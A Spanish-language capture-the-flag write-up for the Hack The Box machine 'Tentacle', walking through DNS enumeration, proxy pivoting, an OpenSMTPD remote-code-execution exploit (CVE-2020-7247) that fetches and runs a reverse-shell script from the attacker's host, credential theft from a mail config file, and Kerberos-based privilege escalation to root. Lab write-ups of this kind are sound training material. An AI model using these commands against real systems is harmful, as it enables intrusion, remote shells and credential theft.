# HTB - Tentacle 

**Dificultad:** Hard  
**OS:** Linux (RHEL 8)  
**IP:** 10.129.6.239  
**Dominio:** REALCORP.HTB

---

## Reconocimiento

### Nmap - Puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.6.239 -oG allPorts
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
3128/tcp open  squid-http
```

### Nmap - Versiones y scripts

```bash
nmap -sV -sC -p22,53,88,3128 -oN target 10.129.6.239
```

Resultados relevantes:
- `53/tcp` → ISC BIND 9.11.20 (RHEL 8)
- `88/tcp` → MIT Kerberos
- `3128/tcp` → Squid http proxy 4.11
- **Host:** `REALCORP.HTB`

---

## Enumeración DNS

```bash
dig @10.129.6.239 any realcorp.htb
```

Se obtiene el nameserver interno:

```
ns.realcorp.htb.    A    10.197.243.77
```

### DNS Brute Force con dnsenum

```bash
dnsenum --dnsserver 10.129.6.239 \
  -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  realcorp.htb
```

Subdominios descubiertos:

| Hostname | IP |
|---|---|
| ns.realcorp.htb | 10.197.243.77 |
| proxy.realcorp.htb | 10.197.243.77 (CNAME) |
| wpad.realcorp.htb | 10.197.243.31 |

---

## Pivoting a través de proxies encadenados

La red interna no es accesible directamente. Se utilizan proxies Squid encadenados en proxychains.

### /etc/hosts

```
10.129.6.239    srv01.realcorp.htb realcorp.htb
10.197.243.77   ns.realcorp.htb proxy.realcorp.htb
10.197.243.31   wpad.realcorp.htb
```

### proxychains4.conf - Cadena de 3 proxies

```ini
strict_chain
localnet 127.0.0.0/255.0.0.0

[ProxyList]
http 10.129.6.239  3128
http 127.0.0.1     3128
http 10.197.243.77 3128
```

### Escaneo a través del proxy

```bash
# 2do salto - ns.realcorp.htb
proxychains4 nmap --top-ports 1000 -sT -Pn 10.197.243.77
# → Puerto 3128 abierto (otro Squid)

# 3er salto - wpad.realcorp.htb
proxychains4 nmap --top-ports 1000 -sT -Pn 10.197.243.31
# → Puerto 80, 3128 abiertos

# Red interna final - 10.241.251.0/24
proxychains4 nmap --top-ports 1000 -sT -Pn 10.241.251.113
# → Puerto 25 (SMTP) abierto
```

Topología de red descubierta:

```
Atacante → srv01:3128 → proxy(127.0.0.1):3128 → ns.realcorp.htb:3128 → 10.241.251.113:25
```

---

## Explotación - OpenSMTPD RCE (CVE-2020-7247)

El SMTP en `10.241.251.113` corre **OpenSMTPD 6.6.1**, vulnerable a RCE.

```bash
searchsploit -m linux/remote/47984.py
```

### Paso 1 - Descargar reverse shell al servidor

```bash
# Levantar servidor HTTP en attacker
python3 -m http.server 80

# Enviar payload para descargar el script
proxychains4 python3 47984.py 10.241.251.113 25 'wget 10.10.14.163 -O /dev/shm/rev'
```

### Paso 2 - Ejecutar reverse shell

```bash
# Levantar listener
nc -lvnp 443

# Ejecutar el script descargado
proxychains4 python3 47984.py 10.241.251.113 25 'bash /dev/shm/rev'
```

Se obtiene shell como `root` en la máquina SMTP (`10.241.251.113`).

---

## Credenciales - j.nakazawa

Dentro de la máquina SMTP, se encuentra el archivo `.msmtprc` del usuario `j.nakazawa`:

```bash
cat /home/j.nakazawa/.msmtprc
```

```
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
```

---

## Acceso SSH con Kerberos - j.nakazawa

### Configurar krb5.conf

```ini
[libdefaults]
    default_realm = REALCORP.HTB

[realms]
    REALCORP.HTB = {
        kdc = srv01.realcorp.htb
    }

[domain_realm]
    .REALCORP.HTB = REALCORP.HTB
    REALCORP.HTB = REALCORP.HTB
```

### Sincronizar tiempo con el KDC (Kerberos requiere < 5 min de diferencia)

```bash
sudo ntpdate 10.129.6.239
```

### Obtener ticket TGT y conectar por SSH

```bash
kinit j.nakazawa
# Password: sJB}RM>6Z~64_

ssh  j.nakazawa@srv01.realcorp.htb
```

### User flag

```
[j.nakazawa@srv01 ~]$ cat user.txt
0ebd823711c7d747b118af203e7e6e59
```

---

## Escalada de privilegios

### Paso 1 - Escribir .k5login en directorio de squid

El usuario `j.nakazawa` tiene permisos de escritura en `/var/log/squid/`. El archivo `.k5login` permite autenticación Kerberos como otro usuario.

```bash
echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
```

### Paso 2 - Autenticarse como admin via Kerberos

```bash
# Desde attacker - obtener ticket y SSH como admin
kinit j.nakazawa
ssh admin@srv01.realcorp.htb
```

### Paso 3 - Leer keytab y acceder al KDC con kadmin

```bash
klist -kt
# → Muestra kadmin/admin@REALCORP.HTB en /etc/krb5.keytab

kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

### Paso 4 - Crear principal root en Kerberos

```
kadmin: add_principal root
# Asignar password al principal root

kadmin: exit
```

### Paso 5 - ksu para escalar a root

```bash
ksu
# Password: la que asignaste al principal root
```

### Root flag

```
[root@srv01 ~]# cat root.txt
a1d854eae3292842232cd4b47d3423e1
```

---

## Resumen de la cadena de ataque

```
1. Enumeración DNS → subdominios internos
2. Proxychains encadenados → acceso a 3 redes internas
3. OpenSMTPD RCE (CVE-2020-7247) → shell en smtp
4. .msmtprc → credenciales j.nakazawa
5. Kerberos kinit + SSH GSSAPI → acceso como j.nakazawa
6. .k5login en /var/log/squid → SSH como admin
7. krb5.keytab + kadmin → crear principal root
8. ksu → root
```

---

## Herramientas utilizadas

- `nmap`, `dnsenum`
- `proxychains4`
- `dig`
- `OpenSMTPD exploit 47984.py` (CVE-2020-7247)
- `kinit`, `klist`, `kadmin`, `ksu`
- `ntpdate`